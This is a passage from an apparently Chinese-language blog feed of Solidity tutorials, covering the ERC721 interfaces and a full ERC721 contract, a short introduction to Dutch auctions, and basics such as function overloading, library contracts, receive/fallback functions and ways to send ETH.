title="IERC721事件"></a>IERC721事件</h5><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenid</code>。</li><li><code>Approval</code>事件：在授权时释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenid</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h5 id="IERC721函数"><a href="#IERC721函数" class="headerlink" title="IERC721函数"></a>IERC721函数</h5><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h4 id="IERC721Receiver"><a href="#IERC721Receiver" class="headerlink" title="IERC721Receiver"></a>IERC721Receiver</h4><p>如果一个合约没有实现<code>ERC721</code>的相关函数，转入的<code>NFT</code>就进了黑洞，永远转不出来了。为了防止误转账，<code>ERC721</code>实现了<code>safeTransferFrom()</code>安全转账函数，目标合约必须实现了<code>IERC721Receiver</code>接口才能接收<code>ERC721</code>代币，不然会<code>revert</code>。<code>IERC721Receiver</code>接口只包含一个<code>onERC721Received()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC721接收者接口：合约必须实现这个接口来通过安全转账接收ERC721</span><br><span class="line">interface IERC721Receiver &#123;</span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看下<code>ERC721</code>利用<code>_checkOnERC721Received</code>来确保目标合约实现了<code>onERC721Received()</code>函数（返回<code>onERC721Received</code>的<code>selector</code>）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _checkOnERC721Received(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private returns (bool) &#123;</span><br><span class="line">        if (to.isContract()) &#123;</span><br><span class="line">            return</span><br><span class="line">                IERC721Receiver(to).onERC721Received(</span><br><span class="line">                    msg.sender,</span><br><span class="line">                    from,</span><br><span class="line">                    tokenId,</span><br><span class="line">                    _data</span><br><span class="line">                ) == IERC721Receiver.onERC721Received.selector;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="IERC721Metadata"><a href="#IERC721Metadata" class="headerlink" title="IERC721Metadata"></a>IERC721Metadata</h4><p><code>IERC721Metadata</code>是<code>ERC721</code>的拓展接口，实现了3个查询<code>metadata</code>元数据的常用函数：</p><ul><li><code>name()</code>：返回代币名称。</li><li><code>symbol()</code>：返回代币代号。</li><li><code>tokenURI()</code>：通过<code>tokenId</code>查询<code>metadata</code>的链接<code>url</code>，<code>ERC721</code>特有的函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface IERC721Metadata is IERC721 &#123;</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256 tokenId) external view returns (string memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ERC721主合约"><a href="#ERC721主合约" class="headerlink" title="ERC721主合约"></a>ERC721主合约</h4><p><code>ERC721</code>主合约实现了<code>IERC721</code>，<code>IERC165</code>和<code>IERC721Metadata</code>定义的所有功能，包含<code>4</code>个状态变量和<code>17</code>个函数。实现都比较简单，每个函数的功能见代码注释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// by 0xAA</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;./IERC165.sol&quot;;</span><br><span class="line">import &quot;./IERC721.sol&quot;;</span><br><span class="line">import &quot;./IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;./IERC721Metadata.sol&quot;;</span><br><span class="line">import &quot;./Address.sol&quot;;</span><br><span class="line">import &quot;./String.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ERC721 is IERC721, IERC721Metadata&#123;</span><br><span class="line">    using Address for address; // 使用Address库，用isContract来判断地址是否为合约</span><br><span class="line">    using Strings for uint256; // 使用String库，</span><br><span class="line"></span><br><span class="line">    // Token名称</span><br><span class="line">    string public override name;</span><br><span class="line">    // Token代号</span><br><span class="line">    string public override symbol;</span><br><span class="line">    // tokenId 到 owner address 的持有人映射</span><br><span class="line">    mapping(uint =&gt; address) private _owners;</span><br><span class="line">    // address 到 持仓数量 的持仓量映射</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line">    // tokenID 到 授权地址 的授权映射</span><br><span class="line">    mapping(uint =&gt; address) private _tokenApprovals;</span><br><span class="line">    //  owner地址。到operator地址 的批量授权映射</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 构造函数，初始化`name` 和`symbol` .</span><br><span class="line">     */</span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        name = name_;</span><br><span class="line">        symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC165接口supportsInterface</span><br><span class="line">    function supportsInterface(bytes4 interfaceId)</span><br><span class="line">        external</span><br><span class="line">        pure</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        return</span><br><span class="line">            interfaceId == type(IERC721).interfaceId ||</span><br><span class="line">            interfaceId == type(IERC165).interfaceId ||</span><br><span class="line">            interfaceId == type(IERC721Metadata).interfaceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的balanceOf，利用_balances变量查询owner地址的balance。</span><br><span class="line">    function balanceOf(address owner) external view override returns (uint) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _balances[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的ownerOf，利用_owners变量查询tokenId的owner。</span><br><span class="line">    function ownerOf(uint tokenId) public view override returns (address owner) &#123;</span><br><span class="line">        owner = _owners[tokenId];</span><br><span class="line">        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的isApprovedForAll，利用_operatorApprovals变量查询owner地址是否将所持NFT批量授权给了operator地址。</span><br><span class="line">    function isApprovedForAll(address owner, address operator)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        return _operatorApprovals[owner][operator];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的setApprovalForAll，将持有代币全部授权给operator地址。调用_setApprovalForAll函数。</span><br><span class="line">    function setApprovalForAll(address operator, bool approved) external override &#123;</span><br><span class="line">        _operatorApprovals[msg.sender][operator] = approved;</span><br><span class="line">        emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的getApproved，利用_tokenApprovals变量查询tokenId的授权地址。</span><br><span class="line">    function getApproved(uint tokenId) external view override returns (address) &#123;</span><br><span class="line">        require(_owners[tokenId] != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">        return _tokenApprovals[tokenId];</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    // 授权函数。通过调整_tokenApprovals来，授权 to 地址操作 tokenId，同时释放Approval事件。</span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private &#123;</span><br><span class="line">        _tokenApprovals[tokenId] = to;</span><br><span class="line">        emit Approval(owner, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的approve，将tokenId授权给 to 地址。条件：to不是owner，且msg.sender是owner或授权地址。调用_approve函数。</span><br><span class="line">    function approve(address to, uint tokenId) external override &#123;</span><br><span class="line">        address owner = _owners[tokenId];</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner || _operatorApprovals[owner][msg.sender],</span><br><span class="line">            &quot;not owner nor approved for all&quot;</span><br><span class="line">        );</span><br><span class="line">        _approve(owner, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查询 spender地址是否可以使用tokenId（他是owner或被授权地址）。</span><br><span class="line">    function _isApprovedOrOwner(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private view returns (bool) &#123;</span><br><span class="line">        return (spender == owner ||</span><br><span class="line">            _tokenApprovals[tokenId] == spender ||</span><br><span class="line">            _operatorApprovals[owner][spender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * 转账函数。通过调整_balances和_owner变量将 tokenId 从 from 转账给 to，同时释放Transfer事件。</span><br><span class="line">     * 条件:</span><br><span class="line">     * 1. tokenId 被 from 拥有</span><br><span class="line">     * 2. to 不是0地址</span><br><span class="line">     */</span><br><span class="line">    function _transfer(</span><br><span class="line">        address owner,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private &#123;</span><br><span class="line">        require(from == owner, &quot;not owner&quot;);</span><br><span class="line">        require(to != address(0), &quot;transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _approve(owner, address(0), tokenId);</span><br><span class="line"></span><br><span class="line">        _balances[from] -= 1;</span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 实现IERC721的transferFrom，非安全转账，不建议使用。调用_transfer函数</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) external override &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _isApprovedOrOwner(owner, msg.sender, tokenId),</span><br><span class="line">            &quot;not owner nor approved&quot;</span><br><span class="line">        );</span><br><span class="line">        _transfer(owner, from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 安全转账，安全地将 tokenId 代币从 from 转移到 to，会检查合约接收者是否了解 ERC721 协议，以防止代币被永久锁定。调用了_transfer函数和_checkOnERC721Received函数。条件：</span><br><span class="line">     * from 不能是0地址.</span><br><span class="line">     * to 不能是0地址.</span><br><span class="line">     * tokenId 代币必须存在，并且被 from拥有.</span><br><span class="line">     * 如果 to 是智能合约, 他必须支持 IERC721Receiver-onERC721Received.</span><br><span class="line">     */</span><br><span class="line">    function _safeTransfer(</span><br><span class="line">        address owner,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private &#123;</span><br><span class="line">        _transfer(owner, from, to, tokenId);</span><br><span class="line">        require(_checkOnERC721Received(from, to, tokenId, _data), &quot;not ERC721Receiver&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 实现IERC721的safeTransferFrom，安全转账，调用了_safeTransfer函数。</span><br><span class="line">     */</span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) public override &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _isApprovedOrOwner(owner, msg.sender, tokenId),</span><br><span class="line">            &quot;not owner nor approved&quot;</span><br><span class="line">        );</span><br><span class="line">        _safeTransfer(owner, from, to, tokenId, _data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // safeTransferFrom重载函数</span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) external override &#123;</span><br><span class="line">        safeTransferFrom(from, to, tokenId, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">     * 铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。</span><br><span class="line">     * 这个mint函数所有人都能调用，实际使用需要开发人员重写，加上一些条件。</span><br><span class="line">     * 条件:</span><br><span class="line">     * 1. tokenId尚不存在。</span><br><span class="line">     * 2. to不是0地址.</span><br><span class="line">     */</span><br><span class="line">    function _mint(address to, uint tokenId) internal virtual &#123;</span><br><span class="line">        require(to != address(0), &quot;mint to zero address&quot;);</span><br><span class="line">        require(_owners[tokenId] == address(0), &quot;token already minted&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">        emit Transfer(address(0), to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 销毁函数，通过调整_balances和_owners变量来销毁tokenId，同时释放Transfer事件。条件：tokenId存在。</span><br><span class="line">    function _burn(uint tokenId) internal virtual &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(msg.sender == owner, &quot;not owner of token&quot;);</span><br><span class="line"></span><br><span class="line">        _approve(owner, address(0), tokenId);</span><br><span class="line"></span><br><span class="line">        _balances[owner] -= 1;</span><br><span class="line">        delete _owners[tokenId];</span><br><span class="line"></span><br><span class="line">        emit Transfer(owner, address(0), tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // _checkOnERC721Received：函数，用于在 to 为合约的时候调用IERC721Receiver-onERC721Received, 以防 tokenId 被不小心转入黑洞。</span><br><span class="line">    function _checkOnERC721Received(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private returns (bool) &#123;</span><br><span class="line">        if (to.isContract()) &#123;</span><br><span class="line">            return</span><br><span class="line">                IERC721Receiver(to).onERC721Received(</span><br><span class="line">                    msg.sender,</span><br><span class="line">                    from,</span><br><span class="line">                    tokenId,</span><br><span class="line">                    _data</span><br><span class="line">                ) == IERC721Receiver.onERC721Received.selector;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 实现IERC721Metadata的tokenURI函数，查询metadata。</span><br><span class="line">     */</span><br><span class="line">    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;</span><br><span class="line">        require(_owners[tokenId] != address(0), &quot;Token Not Exist&quot;);</span><br><span class="line"></span><br><span class="line">        string memory baseURI = _baseURI();</span><br><span class="line">        return bytes(baseURI).length &gt; 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 计算&#123;tokenURI&#125;的BaseURI，tokenURI就是把baseURI和tokenId拼接在一起，需要开发重写。</span><br><span class="line">     * BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ </span><br><span class="line">     */</span><br><span class="line">    function _baseURI() internal view virtual returns (string memory) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="荷兰拍卖"><a href="#荷兰拍卖" class="headerlink" title="荷兰拍卖"></a>荷兰拍卖</h2><p>荷兰拍卖（<code>Dutch Auction</code>）是一种特殊的拍卖形式。 亦称“减价拍卖”，它是指拍卖标的的竞价由高到低依次递减直到第一个竞买人应价（达到或超过底价）时击槌成交的一种拍卖。</p><p>卖家有100朵鲜花，必须在一天内卖完，否则花就谢了。首先，卖家设定最高价为每朵100元，每两个小时降价10元。拍卖开始后没有人竞价。过了两个小时，降到每朵90元时，有个竞买人竞价。如果他买100朵，则拍卖到此结束，此竞买人成为买受人，100朵鲜花以每朵90元成交。如果他只买70朵，那么剩下的30朵继续拍卖。如果一天过去了，不再有人竞价，那么拍卖的结果是唯一的竞买人成为买受人，以每朵90元的成交价买走70朵花。但是，如果过了两小时又有人来竞买剩下的30朵花，而价格为每朵80元。这时结束拍卖，第一个人以每朵90元的价格买了70朵，第二个人以每朵80元的价格买了30朵。</p><p>在币圈，很多<code>NFT</code>通过荷兰拍卖发售，其中包括<code>Azuki</code>和<code>World of Women</code>，其中<code>Azuki</code>通过荷兰拍卖筹集了超过<code>8000</code>枚<code>ETH</code>。</p><p>项目方非常喜欢这种拍卖形式，主要有两个原因</p><ol><li>荷兰拍卖的价格由最高慢慢下降，能让项目方获得最大的收入。</li><li>拍卖持续较长时间（通常6小时以上），可以避免<code>gas war</code>。</li></ol><p><strong>荷兰拍卖合约</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ERC20&quot;&gt;&lt;a href=&quot;#ERC20&quot; class=&quot;headerlink&quot; title=&quot;ERC20&quot;&gt;&lt;/a&gt;ERC20&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ERC20&lt;/code&gt;是以太坊上的代币标准，来自2015年11月V神参与的&lt;a href=&quot;https</summary>
      
    
    
    
    
    <category term="区块链" scheme="https://banana69.site/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Solididy进阶</title>
    <link href="https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/"/>
    <id>https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/</id>
    <published>2022-10-22T01:24:02.000Z</published>
    <updated>2022-11-10T11:29:08.220Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-函数重载"><a href="#0x01-函数重载" class="headerlink" title="0x01 函数重载"></a>0x01 函数重载</h3><p>函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<code>solidity</code>不允许修饰器（<code>modifier</code>）重载。</p><p>重载函数在经过编译后，由于不同的参数类型，其函数选择器也不相同。</p><p>再调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配，如果出现多个匹配的重载函数则会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>f(50)</code>会报错，因为 50 既可以被转换为 uint8 ，也可以被转换为uint256。</p><h3 id="0x02-库合约"><a href="#0x02-库合约" class="headerlink" title="0x02 库合约"></a>0x02 库合约</h3><p>库函数是一种特殊的合约，为了提升<code>solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约一般都是一些好用的函数合集（<code>库函数</code>）。</p><p>库合约与普通合约有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接受以太币</li><li>不可以被销毁</li></ol><p><strong>使用库合约：</strong></p><ol><li><p><strong>using for</strong></p><p> <code>using for</code>指令可将库函数附加到任何类型，添加指令后，库 A 中的函数会自动添加为 B 类型变量的成员，并且可以直接调用，<strong>在调用时，这个变量会被当作第一个参数传递给函数。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>通过库合约名称调用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><code>String</code>库合约是将uint256类型转换为相应的<code>string</code>类型的代码库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收与发送ETH"><a href="#接收与发送ETH" class="headerlink" title="接收与发送ETH"></a>接收与发送ETH</h3><h5 id="接收ETH"><a href="#接收ETH" class="headerlink" title="接收ETH"></a>接收ETH</h5><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用</li></ol><ul><li><p><strong>receive()</strong></p><p><code>receive()</code>合约用来接收ETH，一个合约最多有一个 <code>receive()</code>函数，声明该函数时必须包含<code>external</code>和<code>payable</code>关键字，当合约接收到ETH时，<code>receive()</code>会被触发。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>fallback()</strong></p><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发，在声明时也必须包含<code>external</code>关键字，一般会用<code>payable</code>修饰。</p><pre><code>// fallbackfallback() external payable&#123;    emit fallbackCalled(msg.sender, msg.value, msg.data);&#125;</code></pre></li></ul><p><code>receive()</code>和<code>fallback()</code>的区别在于合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>，<code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约发送<code>ETH</code>将会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><h5 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h5><p>在部署可以发送ETH的合约时需要在合约中实现<code>payable</code>的构造函数和<code>receive()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>。</p><h6 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h6><p>用法：<code>address(receiver).transfer(amount)</code></p><p><code>transfer()</code>的 gas 限制是 2300，可以足够用于转账，但如果接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑，否则会导致错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).send(amount)</code></p><p><code>send()</code>函数的的gas与<code>transfer()</code>相同也是2300gas，但也要求接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑。</p><p>如果转账失败不会<code>revert</code>，而是会返回<code>false</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function sendETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">bool success = _to.send(amount);</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert SendFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send-1"><a href="#send-1" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).call&#123;value: amount(&quot;&quot;)&#125;</code></p><p><code>call()</code>没有gas限制，在可以支持接受合约的<code>fallback()</code>或者<code>receive()</code>实现复杂的逻辑，当<code>call()</code>转账失败也不会revert，<code>call()</code>的返回值是<code>(bool, data)</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSendETH(address payable _to, unint256 amount) external payable&#123;</span><br><span class="line">(bool success, )= _to.call&#123;value:amount&#125;(&quot;&quot;)</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert CallFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h3><p>调用<code>OtherContract</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private 